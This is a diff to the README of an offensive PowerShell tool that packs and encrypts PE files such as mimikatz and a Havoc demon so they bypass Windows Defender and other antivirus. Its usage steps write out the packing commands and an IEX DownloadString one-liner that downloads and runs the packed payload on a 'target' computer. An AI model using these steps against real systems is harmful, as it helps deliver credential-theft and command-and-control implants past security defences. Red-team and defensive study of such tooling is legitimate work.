@@ -1,6 +1,7 @@
 ### Invoke-PoSH-PePacker.ps1
 --------------------------------------
 'Invoke-PoSH-PePacker' allows to pack and encrypt offensive PE files in order to bypass AV solutions such as Windows Defender.
+It generates an obfuscated and encrypted PowerShell script that contains the PE file.
 
 #### FEATURES
   - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
@@ -13,7 +14,7 @@
     - wait for 60 seconds before execution
   
 #### USAGE
-  - Step 1. Generate a packed & encrypted version of a PE file (e.g. mimikatz.exe, havocdemon.exe) stored locally or on a remote web server
+  - Step 1. Generate an obfuscated & encrypted PowerShell script that contains your PE file (e.g. mimikatz.exe, havocdemon.exe) stored locally or on a remote web server.
 ```
 PS C:\> Import-Module ./Invoke-PoSH-PePacker.ps1
 PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
@@ -26,7 +27,7 @@ PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\P
 --- or ---
 PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1 -sandbox
 ```
-  - Step 2. Download & execute the packed & encrypted PowerShell script on a target Windows computer
+  - Step 2. Download & execute the obfuscated & encrypted PowerShell script (that contains your PE file) on a target Windows computer
 ```
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE
 --- or ---
